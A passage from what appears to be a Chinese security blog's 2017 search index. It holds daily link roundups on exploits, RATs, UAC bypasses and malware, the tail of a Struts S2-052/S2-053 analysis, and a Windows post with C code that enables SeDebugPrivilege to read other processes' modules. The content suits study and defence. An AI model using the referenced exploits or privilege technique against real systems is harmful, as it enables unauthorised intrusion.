reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt;&lt;/map&gt; 补丁对比补丁代码S2-053 关于s2-053的漏洞问题是安全编码和习惯的问题,而非struts2通杀漏洞。官方通告 较s2-052，s2-053漏洞更简单和直接。小结 我还是喜欢用eclipse分析java漏洞。，还是好像还是idea比较好用啊，只是从eclipse切换过来略蛋疼。切换过来之后，你会发现你的ide好像都要是JetBrains这个公司的了。 基础还是不够牢固，给自己定个小计划，后面有时间把所有的s2漏洞分析一下。总结一下思路。Reference Standard way to serialize and deserialize Objects with XStreamhttp://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o 一步一步的构造payloadhttps://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java XStream “Remote Code Execution” exploit on code from “Standard way to serialize and deserialize Objects with XStream” articlehttp://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1 Struts2 S2-052 RCE分析与利用https://paper.seebug.org/383/ CVE-2017-9805:Struts2 REST插件远程执行命令漏洞(S2-052) 分析报告https://yq.aliyun.com/articles/197926 S2-052漏洞分析及官方缓解措施无效验证http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/ Struts2 S2-052漏洞分析https://www.waitalone.cn/struts2-s2-052.html Struts2-052漏洞分析https://yaofeifly.github.io/2017/09/08/Struts2-052/ Apache Struts2 Remote Code Execution (S2-053)http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/ S2-053 复现分析过程(附POC)https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA Struts 2 S2-053漏洞分析（附POC）http://www.freebuf.com/vuls/147735.html 来自McAfee对s2-052的分析https://securingtomorrow.mcafee.com/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/ GCC 合并了我写的代码，从编译器开始解决安全问题。来自嘶吼，作者为吴潍浠http://www.4hou.com/binary/7688.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170917安全动态]]></title>
    <url>%2F2017%2F09%2F17%2F20170917%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 逆向英雄联盟客户端https://nickcano.com/reversing-league-of-legends-client/ 通过Chrome DLL劫持藏在广告软件包中的盗密码后门https://www.bleepingcomputer.com/news/security/adware-installs-infostealer-trojan-that-it-loads-via-chrome-dll-hijacking/ 后渗透框架RemoteReconhttps://github.com/xorrior/RemoteRecon D-Link DIR8xx Routers多个漏洞本地固件上传：https://www.exploit-db.com/exploits/42731/登录凭证泄露：https://www.exploit-db.com/exploits/42729/ROOT权限远程代码执行：https://www.exploit-db.com/exploits/42730/ Debug Cisco ASA Tools 检测Mimikatz及其他可疑LSASS访问https://www.eideon.com/2017-09-09-THL01-Mimikatz/ 安全专家研究发现PyPI一直在托管恶意软件库https://www.theregister.co.uk/2017/09/15/pretend_python_packages_prey_on_poor_typing/ JS中的危险函数（Part 1）http://blog.blueclosure.com/2017/09/javascript-dangerous-functions-part-1.html 成为网络中的幽灵https://github.com/cryptolok/GhostInTheNet 学会利用HTTP PUThttp://www.hackingtutorials.org/exploit-tutorials/metasploitable-3-exploiting-http-put/ Code Audit Challenges 代码审计练习题https://github.com/CHYbeta/Code-Audit-Challenges 比敌人更了解敌人 [ 取证入门 web篇 ]http://www.freebuf.com/column/147929.html其它 最近觉得shadowsocks代理打开被强的网站速度很慢，修改了一下加密方式由aes-256-cfb改为了aes-128-cfb后速度快了好多。虽然安全性稍微差了点儿。。 tcpdump使用有时候再没有安装类似wireshark的环境下，可能就需要用到tcpdump来进行抓包。命令支持的参数比较的多，而且提供了and ，or，not等逻辑关键词来进行流量的筛选和过滤，用的时候 man一下会用就可以了，几个点需要注意一下，就是-i 主机有一个网卡还好，如果多个网卡的话，就必须要-i 指定要抓取流量的网卡其它常用过滤关键词 src dst host 等]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170915安全动态]]></title>
    <url>%2F2017%2F09%2F15%2F20170915%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Windows for Linux Nerdshttps://blog.jessfraz.com/post/windows-for-linux-nerds/ 30 个有趣的 Linux Shell 命令https://www.lopezferrando.com/30-interesting-shell-commands/ 【干货分享】XSS攻击进阶篇——那些年我们看不懂的XSShttp://blog.nsfocus.net/xss-advance/ Radare 2之旅：通过crackme实例讲解Radare 2在逆向中的应用（上）http://bobao.360.cn/learning/detail/4400.html 妙用JavaScript绕过XSS过滤http://bobao.360.cn/learning/detail/4414.html 从SQL注入到管理员权限https://www.notsosecure.com/anatomy-of-a-hack-sqli-to-enterprise-admin/ 1感觉渗透外国人的思路还是不错 Windbg-Cheat-Sheethttps://github.com/bulentrahimkazanci/Windbg-Cheat-Sheet free open-source macOS firewallhttps://github.com/objective-see/LuLu CVE-2017-0213: Windows COM权限提升漏洞https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213 REST API Security Testing with Acunetix 又一个web扫描器 Spaghettihttps://github.com/m4ll0k/Spaghetti Ansible Vault、Tablib YAML解析器原创代码执行漏洞http://blog.talosintelligence.com/2017/09/vulnerability-spotlight-yaml-remote.html 小心Bashware：恶意软件绕过杀软的新思路,这种方法利用 Windows 10 新支持的 WSL（Linux 子系统）特性可以 Bypass 现有杀软的检测防护体系https://research.checkpoint.com/beware-bashware-new-method-malware-bypass-security-solutions/ Luckystrike：恶意office文档生成器https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator 使用D-Link路由器构建僵尸网络https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin InjectProc - 进程注入工具https://github.com/secrary/InjectProc 1好像没什么新奇的，还是基于CreateRemoteThread()函数的。 ThunderShell - 基于 Powershell 实现的后门https://github.com/Mr-Un1k0d3r/ThunderShell Apache Struts2 Remote Code Execution (S2-053)http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/ MIPS 初探https://mp.weixin.qq.com/s?__biz=MzIxNjU3ODMyOQ==&amp;mid=2247483677&amp;idx=1&amp;sn=a6df6660510f610aa57bc1127457f9d0 Xposed知多少？http://www.freebuf.com/column/147856.html PHP漏洞挖掘——进阶篇http://blog.nsfocus.net/php-vulnerability-mining/]]></content>
  </entry>
  <entry>
    <title><![CDATA[win64逆向]]></title>
    <url>%2F2017%2F09%2F14%2Fwin64%E9%80%86%E5%90%91%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[UAC原理]]></title>
    <url>%2F2017%2F09%2F14%2FUAC%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[原理先通过whoami/all 来看一下windows的用户和权限相关Reference:用户帐户控制的工作原理.aspx)UAC的前世今生UAC 实现原理及绕过方法UAC攻击剖析Dridex使用的一种新型UAC绕过方法UACME]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170914安全动态]]></title>
    <url>%2F2017%2F09%2F14%2F20170914%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 RHme3 CTF 一道 UAF 题的 Writeuphttps://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580 昨天推送的 Microsoft Office RTF WSDL Parser 野外被利用 0Day 的 PoC：https://github.com/Voulnet/CVE-2017-8759-Exploit-samplehttps://github.com/vysec/CVE-2017-8759 上周推送过 FireEye 一篇监控 Windows Console 活动的 Blog，有位研究员根据 Blog 自己实现了一个工具https://github.com/EyeOfRa/WinConMon 利用 PHP Sessions 文件将 LFI 漏洞升级为 RCEhttps://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions Use DNS Rebinding to Bypass SSRF in Javahttps://paper.seebug.org/390/ Linux Hacking Tools 收集http://pastebin.com/raw/qeHD8j92 Ruby ERB 模板注入攻击https://www.trustedsec.com/2017/09/rubyerb-template-injection/ IoT设备固件分析教程之固件是怎么存储的https://mp.weixin.qq.com/s/kANceRdTAocCRpkCB1lsjQ 绕过UAC系列之 SDCLT的利用https://zhuanlan.zhihu.com/p/29325846 DownAndExec：银行恶意软件利用巴西的CDN传播（CDN已经成为传播恶意软件的新方法）https://www.welivesecurity.com/2017/09/13/downandexec-banking-malware-cdns-brazil/ S2-053http://vinc.top/2017/09/14/%E3%80%90struts2%E3%80%91s2-053/ 我是怎样一步一步实现微信自动抢红包的？http://bbs.iosre.com/t/topic/9529/4 从PHP源码与扩展开发谈PHP任意代码执行与防御 php安全https://blog.zsxsoft.com/post/30 【技术分享】如何构建安全的API（part1）http://bobao.360.cn/learning/detail/4394.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[windows权限提升]]></title>
    <url>%2F2017%2F09%2F13%2Fwindows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%2F</url>
    <content type="text"><![CDATA[简述 还是直接看代码吧，我们直接使用如下的代码进行线程所加载模块的查看。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596//powershell 获取进程所加载的dll方法 https://stackoverflow.com/questions/9041062/retrieving-dll-path-of-a-running-process//#include &lt;windows.h&gt; #include &lt;tlhelp32.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt;// Forward declarations: BOOL ListProcessModules(DWORD dwPID);void printError(TCHAR* msg);int _tmain(int argc, TCHAR* argv[])&#123; if (argc != 2) &#123; printf(&quot;\n Usage : GetProcessDll.exe &lt;processid&gt; \n\n&quot;); return 1; &#125; //ListProcessModules(GetCurrentProcessId()); DWORD pid = wcstod(argv[1], _T(&apos;\0&apos;)); ListProcessModules(pid); return 0;&#125;BOOL ListProcessModules(DWORD dwPID)&#123; HANDLE hModuleSnap = INVALID_HANDLE_VALUE; MODULEENTRY32 me32; // Take a snapshot of all modules in the specified process. hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); if (hModuleSnap == INVALID_HANDLE_VALUE) &#123; printError(TEXT(&quot;CreateToolhelp32Snapshot (of modules)&quot;)); return(FALSE); &#125; // Set the size of the structure before using it. me32.dwSize = sizeof(MODULEENTRY32); // Retrieve information about the first module, // and exit if unsuccessful if (!Module32First(hModuleSnap, &amp;me32)) &#123; printError(TEXT(&quot;Module32First&quot;)); // Show cause of failure CloseHandle(hModuleSnap); // Must clean up the snapshot object! return(FALSE); &#125; // Now walk the module list of the process, // and display information about each module do &#123; _tprintf(TEXT(&quot;\n\n MODULE NAME: %s&quot;), me32.szModule); _tprintf(TEXT(&quot;\n executable = %s&quot;), me32.szExePath); _tprintf(TEXT(&quot;\n process ID = 0x%08X&quot;), me32.th32ProcessID); _tprintf(TEXT(&quot;\n ref count (g) = 0x%04X&quot;), me32.GlblcntUsage); _tprintf(TEXT(&quot;\n ref count (p) = 0x%04X&quot;), me32.ProccntUsage); _tprintf(TEXT(&quot;\n base address = 0x%08X&quot;), (DWORD)me32.modBaseAddr); _tprintf(TEXT(&quot;\n base size = %d&quot;), me32.modBaseSize); &#125; while (Module32Next(hModuleSnap, &amp;me32)); _tprintf(TEXT(&quot;\n&quot;)); // Do not forget to clean up the snapshot object. CloseHandle(hModuleSnap); return(TRUE);&#125;void printError(TCHAR* msg)&#123; DWORD eNum; TCHAR sysMsg[256]; TCHAR* p; eNum = GetLastError(); FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, eNum, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language sysMsg, 256, NULL); // Trim the end of the line and terminate it with a null p = sysMsg; while ((*p &gt; 31) || (*p == 9)) ++p; do &#123; *p-- = 0; &#125; while ((p &gt;= sysMsg) &amp;&amp; ((*p == &apos;.&apos;) || (*p &lt; 33))); // Display the message _tprintf(TEXT(&quot;\n WARNING: %s failed with error %d (%s)&quot;), msg, eNum, sysMsg);&#125; 如下图所示我们可以看到，当我们查看notepad.exe进程中的dll时是可以成功的，但是要查看svhost.exe(pid=4620)的时候，程序报错了( CreateToolhelp32Snapshot (of modules) failed with error 5 (?????)),即在查看进程所属的用户相同的时候是可以正常查看的，如果是所属不同用户的话就会失败。 这个时候我们添加如下的函数并调用它12345678910111213141516171819202122VOID DebugPrivilege()&#123; HANDLE hToken = NULL; BOOL bRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken); if (bRet == TRUE) &#123; TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid); tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); CloseHandle(hToken); &#125;&#125; 以上代码的作用是将运行的程序的权限提升至“SeDebugPrivilege“，拥有该权限以后，当前进程可以访问一些受限的系统资源。调整进程权限的步骤如下：1.使用OpenProcessToken函数打开当前进程的访问令牌。2.使用LookupPrivilegeValue函数取得描述权限的LUID。3.使用AdjustTokenPrivilege函数调整访问令牌的权限。 Reference https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-privilege]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170913安全动态]]></title>
    <url>%2F2017%2F09%2F13%2F20170913%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 CVE-2016-10190 FFmpeg Http协议 heap buffer overflow漏洞分析及利用http://www.freebuf.com/column/147585.html Catfish—缓存漏洞&amp;&amp;配合CSRF到Getshellhttps://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484120&amp;idx=1&amp;sn=aaeec3238102fdf88a22ffb1b9f30a47 【干货分享】手把手教你Android Logcat组件安全http://blog.nsfocus.net/android-logcat-security/ 逆向 OBi200 谷歌语音设备https://randywestergren.com/reverse-engineering-obi200-google-voice-appliance-part-1/https://randywestergren.com/reverse-engineering-obi200-google-voice-appliance-part-2/ [ IoTDevice ] ARM exploitation for IoT - part 2https://quequero.org/2017/09/arm-exploitation-iot-episode-2 windows-event-forwarding - 一款使用 Windows 事件转发来进行事件的检测与响应的工具https://github.com/palantir/windows-event-forwarding&#x68;&#x74;&#x74;&#112;&#x73;&#x3a;&#x2f;&#x2f;&#109;&#101;&#x64;&#x69;&#117;&#109;&#x2e;&#x63;&#x6f;&#x6d;&#47;&#64;&#x70;&#x61;&#108;&#97;&#x6e;&#116;&#105;&#114;&#47;&#x77;&#105;&#110;&#x64;&#111;&#119;&#115;&#x2d;&#101;&#x76;&#x65;&#110;&#116;&#45;&#102;&#111;&#114;&#x77;&#x61;&#x72;&#100;&#x69;&#x6e;&#103;&#x2d;&#x66;&#111;&#x72;&#x2d;&#110;&#101;&#x74;&#119;&#111;&#x72;&#107;&#45;&#x64;&#101;&#102;&#101;&#110;&#115;&#x65;&#x2d;&#x63;&#x62;&#x32;&#48;&#x38;&#x64;&#x35;&#x66;&#102;&#56;&#54;&#x66; ZDI 对补丁日的总结https://www.thezdi.com/blog/2017/9/12/the-september-2017-security-update-review [ Industry News ] Kromtech 安全中心的人发现 超过 4000 个 ElasticSearch 服务器托管着 PoS 恶意软件(AlinaPOS、 JackPOS)https://www.bleepingcomputer.com/news/security/over-4-000-elasticsearch-servers-found-hosting-pos-malware-files/ Strust2漏洞影响多个Cisco产品http://thehackernews.com/2017/09/apache-struts-flaws-cisco.html CURL会有后门吗？https://daniel.haxx.se/blog/2017/09/12/the-backdoor-threat/ 最近挖src一些小套路总结http://www.cuijianxiong.top/?p=148 工控蜜罐Conpot部署和入门指南http://www.freebuf.com/column/147545.html fuel UX 前端框架 bootstrap的扩展http://getfuelux.com/ Linux Rootkit系列一：LKM的基础编写及隐藏http://www.freebuf.com/articles/system/54263.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170912安全动态]]></title>
    <url>%2F2017%2F09%2F12%2F20170912%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 被黑掉的 WordPress 服务器分析https://www.codemetrix.net/examining-a-hacked-php-server/ 通过 DNS 响应欺骗来绕过域控制验证https://labs.detectify.com/2017/09/11/guest-blog-bypassing-domain-control-verification-with-dns-response-spoofing/ 使用 Excel.Application 和 DCOM 进行横向渗透https://posts.specterops.io/lateral-movement-using-excel-application-and-dcom-enigma0x3-on-wordpress-com-d11d56e504dc Siofra - DLL 劫持漏洞扫描器、PE 感染工具https://github.com/falexorr/Siofra 基于 Windows Event Forwarding 机制的网络防御措施，之前也推送过一篇微软的《基于 Windows Event Forwarding 的入侵检测》 Cuckoo Sandbox 分析框架更新 2.0.4 版本https://cuckoosandbox.org/blog/cuckoo-sandbox-204 The Road To HSTShttps://engineeringblog.yelp.com/2017/09/the-road-to-hsts.html PaX/Grsecurity 新手教程 Grsecurity 是一套增强 Linux 内核安全的内核补丁集，能够轻松应对各种严重安全威胁。https://github.com/hardenedlinux/grsecurity-101-tutorials 据 Check Point 安全人员说 Windows 10 内置的 Linux Shell 可以被利用来隐藏恶意软件https://motherboard.vice.com/en_us/article/xwwexa/windows-10s-built-in-linux-shell-could-be-abused-to-hide-malware-researchers-say Docker Daemon - Unprotected TCP Socket (Metasploit)https://www.exploit-db.com/exploits/42650/ idb: 用于简化iOS渗透测试及研究的工具https://github.com/dmayer/idb 【技术分享】在细节中捕捉恶魔 ：提升Cuckoo沙箱捕获恶意Office样本行为的能力http://bobao.360.cn/learning/detail/4409.html [用 Java 写一个 JVM] （一）刚好够运行 HelloWorldhttps://www.v2ex.com/t/390110#reply16 安息吧 REST API，GraphQL 长存https://segmentfault.com/a/1190000011109222 【技术分享】见招拆招：详谈COM接口函数Hook技术http://bobao.360.cn/learning/detail/4405.html 聊聊CVE漏洞编号和正式公开那些事http://blog.nsfocus.net/cve-vulnerability-numbers-officially-disclose/ Chrome Unsafe-inline CSP Bypasshttps://www.math1as.com/index.php/archives/507/]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170911安全动态]]></title>
    <url>%2F2017%2F09%2F11%2F20170911%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol，研究员公开了 Dlink 850L 路由器的多个 0Dayhttps://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html 逆向 Aura 智能闹钟https://courk.fr/index.php/2017/09/10/reverse-engineering-exploitation-connected-clock/ IOT 安全 – Part 2: IOT 攻击面http://payatu.com/iot-security-part-2-101-iot-attack-surface/ struts-pwn_CVE-2017-9805: S2-052 漏洞利用脚本https://github.com/mazen160/struts-pwn_CVE-2017-9805 GreatSCT - 一款应用白名单绕过工具https://github.com/GreatSCT/GreatSCT 古老的 MS08-067 漏洞中 MSRPC NetPathCanonicalize 路径格式化函数在处理 “..” 时的栈破坏漏洞分析http://www.tiagoalexandre.com/security/exploit%20development/2017/09/08/MS08-067 利用 ADS（Alternate Data Streams）Bypass UAChttps://www.redcanary.com/blog/using-alternate-data-streams-bypass-user-account-controls/ 维基解密是如何遭到黑客攻击的https://zhuanlan.zhihu.com/p/29162387 Web 安全方向上的资料整理https://github.com/CHYbeta/Web-Security-Learning 虐待二进制执行分析框架 Triton，挑战它的控制流图还原功能https://blog.quarkslab.com/mistreating-triton.html 软件供应链来源攻击分析报告https://mp.weixin.qq.com/s/I6cJ7xgT5mTESL0TXa1DBw 西方红玫瑰和辣条先生黑产组织深度分析报告http://www.freebuf.com/articles/paper/145777.html iOS也不安全？高危漏洞威胁近半果粉https://mp.weixin.qq.com/s/bwPwySM3ZjqLWyNN99a5ow 如何将Pastebin上的信息应用于安全分析和威胁情报领域https://techanarchy.net/2017/09/hunting-pastebin-with-pastehunter/ DEDECMS 会员中心代码投稿缺陷可getshellhttps://mp.weixin.qq.com/s/_t6h7PosyVGsSAChqDQRfg Windows内核驱动漏洞利用代码开发简介（part-1） - 环境设置 Windows内核漏洞利用代码开发开发简介（part2）：如何利用堆缓冲区溢出漏洞到系统shellhttps://glennmcgui.re/introduction-to-windows-kernel-exploitation-pt-1/ 苹果Touch ID安全性浅谈&#104;&#116;&#x74;&#112;&#115;&#x3a;&#47;&#47;&#x6d;&#x65;&#x64;&#x69;&#117;&#x6d;&#46;&#x63;&#x6f;&#109;&#47;&#64;&#102;&#x73;&#x74;&#x69;&#101;&#x68;&#108;&#x65;&#47;&#100;&#101;&#x6d;&#121;&#115;&#x74;&#105;&#102;&#x79;&#105;&#x6e;&#x67;&#45;&#x61;&#112;&#112;&#x6c;&#101;&#x73;&#x2d;&#116;&#111;&#x75;&#x63;&#x68;&#x2d;&#x69;&#100;&#45;&#x34;&#x38;&#56;&#x33;&#100;&#x35;&#x31;&#x32;&#x31;&#x62;&#x37;&#55; Vulners Python API wrapperhttps://github.com/vulnersCom/api 手工逆 Chrome 扩展后门的一些思路https://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=2651081304&amp;idx=1&amp;sn=8f63e1cfd3261763ff8d982c045d0c51 【技术分享】how2heap总结-上 堆溢出http://bobao.360.cn/learning/detail/4386.html python的多进程编程https://www.keakon.net/2017/09/09/Python%E7%9A%84%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%BC%96%E7%A8%8B1深入的讲解了一些原理性的东西]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170908安全动态]]></title>
    <url>%2F2017%2F09%2F08%2F20170908%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Django debug page XSS漏洞（CVE-2017-12794）分析https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html Python 反序列化漏洞利用https://crowdshield.com/blog.php?name=exploiting-python-deserialization-vulnerabilities 攻击嵌入式设备与网络协议，来自 zer0con 大会https://pierrekim.github.io/advisories/z0-Owning_embedded_devices_and_network_protocols-redacted.pdf Source for macOS 10.12.5 and 10.12.6 macOS源码https://opensource.apple.com/release/macos-10125.htmlhttps://opensource.apple.com/release/macos-10126.html SymGDB - 一款基于 Triton 的 GDB 符号执行插件https://github.com/SQLab/symgdbhttps://hitcon.org/2017/CMT/slide-files/d2_s1_r0.pdf DKMC - 将 Payload 放到图片中实现免杀效果的工具https://github.com/Mr-Un1k0d3r/DKMC Windows 内核驱动漏洞利用系列 Part 1https://glennmcgui.re/introduction-to-windows-kernel-exploitation-pt-1/ Linux进程间代码注入https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html PiFinger：检测当前网络中是否存在Wifi- Pineapple，并评估当前wifi网络的安全性https://github.com/besimaltnok/PiFinger Hunting Pastebin with PasteHunterhttps://techanarchy.net/2017/09/hunting-pastebin-with-pastehunter/ 看我如何破解Dlink 850路由器然后滥用MyDlink Cloud协议https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html Abusing JavaScript frameworks to bypass XSS mitigationshttp://blog.portswigger.net/2017/09/abusing-javascript-frameworks-to-bypass.html Using Alternate Data Streams to Bypass User Account Controlshttps://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-WScriptBypassUAC.ps1 渗透3389端口http://www.hackingarticles.in/penetration-testing-remote-desktop-port-3389/ 安全研究人员披露D-Link路由器漏洞http://www.securityweek.com/unpatched-d-link-router-vulnerabilities-disclosed 机器学习对抗资源集合https://github.com/yenchenlin/awesome-adversarial-machine-learning 开源可定制远程管理工具（RAT）https://github.com/SySS-Research/outis XML的花式利用https://blog.pragmatists.com/xml-be-cautious-69a981fdc56a?gi=38c5799a5aa4其它 C/C++ 开源库及示例代码https://github.com/programthink/opensource/blob/master/libs/cpp.wiki vc sampleshttps://github.com/Microsoft/VCSamples Automated malcode analysis systemhttps://github.com/dzzie/SysAnalyzer 一个基于命令行的翻译工具https://github.com/soimort/translate-shell python生成验证码https://lizonghang.github.io/2016/07/30/Python%E7%94%9F%E6%88%90%E9%AA%8C%E8%AF%81%E7%A0%81/]]></content>
  </entry>
  <entry>
    <title><![CDATA[指针参数传递与数据安全]]></title>
    <url>%2F2017%2F09%2F07%2F%E6%8C%87%E9%92%88%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[知识扫盲 理解常值变量和符号常量的区别在定义时用const修饰的普通变量称为常值变量.例如：const int MaxLint = 1000;const float Pi = 3.1415926;指针做函数参数时，参数的传递效率非常高，通过指针可以对指针所指内存进行读/写。在实际的编程中，若函数的形参为指针，则该函数只是读取指针所指内存的数据，则应将该指针用const修饰，以限制在函数体内对指针所指内存的修改。这样，即兼顾了指针参数的高效传递，又兼顾了指针所指数据的安全。如果函数的形参为引用，且该函数只是读取引用所关联的变量，则也应该采用相同的措施。代码示例12345678910111213141516171819202122232425262728#include &quot;iostream&quot;using namespace std;//void sp_to_dash(const char *s)//&#123;// while(*s)// &#123;// if(*s == &apos; &apos;) *s = &apos;_&apos;;//添加const修饰，这里在修改指针所指变量的值时候，编译器会报错// cout&lt;&lt; *s++;// &#125;//&#125;void sp_to_dash(const char *s)&#123; while(*s) &#123; if(*s == &apos; &apos;) cout&lt;&lt;&apos;_&apos;; else cout&lt;&lt;*s; s++; &#125;&#125;int main()&#123; sp_to_dash(&quot;hello !&quot;); cout&lt;&lt;endl; return 0;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170907安全动态]]></title>
    <url>%2F2017%2F09%2F07%2F20170907%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 3gstudent/Pentest-Tips: A collection of pentest tipshttps://github.com/3gstudent/Pentest-and-Development-Tips 数字签名攻击报告：正在摧毁软件身份“信用体系”的安全危机http://www.freebuf.com/articles/network/146274.html Hunting With Active Directory Replication Metadatahttps://posts.specterops.io/hunting-with-active-directory-replication-metadata-1dab2f681b19 Syzygy - PE 文件的文件重写工具（Binary Rewriting），可以实现代码块分析和重构等功能http://doar-e.github.io/blog/2017/08/05/binary-rewriting-with-syzygy/ InfoCON - 专门收集各大信息安全会议资料的网站https://infocon.org/cons/ FrauDroid - 一个精确的大规模自动化手机广告欺诈检测的方法https://arxiv.org/pdf/1709.01213.pdf 滥用 .htaccess 实现 Web 漏洞的利用&#104;&#x74;&#116;&#x70;&#115;&#58;&#x2f;&#x2f;&#x6d;&#x65;&#100;&#x69;&#x75;&#x6d;&#46;&#x63;&#111;&#109;&#x2f;&#x40;&#x69;&#x6e;&#x73;&#101;&#99;&#117;&#x72;&#105;&#x74;&#x79;&#x5f;&#57;&#x32;&#52;&#55;&#x37;&#47;&#x75;&#116;&#x69;&#x6c;&#x69;&#x7a;&#105;&#x6e;&#103;&#45;&#x68;&#116;&#97;&#99;&#x63;&#x65;&#115;&#x73;&#x2d;&#x66;&#111;&#x72;&#45;&#x65;&#120;&#112;&#108;&#111;&#105;&#x74;&#97;&#x74;&#105;&#111;&#x6e;&#45;&#x70;&#x75;&#114;&#x70;&#111;&#115;&#x65;&#x73;&#45;&#x70;&#x61;&#114;&#x74;&#45;&#49;&#x2d;&#x35;&#55;&#51;&#51;&#100;&#100;&#55;&#x66;&#x63;&#x38;&#101;&#98; Wireless IP Camera (P2P) WIFICAM 无线摄像头的多个高危漏洞详情https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html 黑客免费提供的Cobian RAT中暗藏后门http://thehackernews.com/2017/09/backdoored-hacking-tools.html 如何制作基础认证钓鱼页面https://securitycafe.ro/2017/09/06/phishy-basic-authentication-prompts/ JavaScript WebSocket Backdoor: 浏览器后门https://n0where.net/javascript-websocket-backdoor-browserbackdoor/ Java-Deserialization-Cheat-Sheet java反序列化 IPTables工作原理分析 Command and Control – DNS DNS隧道https://pentestlab.blog/2017/09/06/command-and-control-dns/ 其它 Visual Studio 2015 中的 Visual C++https://msdn.microsoft.com/zh-cn/library/60k1461a.aspx 1如果大学时候用这种教材学的话，应该会好很多吧。。。 linux的静态编译和动态编译http://blog.csdn.net/l_yangliu/article/details/6951005 1通过gcc去理解动态链接和静态链接的区别]]></content>
  </entry>
  <entry>
    <title><![CDATA[yara使用说明]]></title>
    <url>%2F2017%2F09%2F06%2Fyara%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%2F</url>
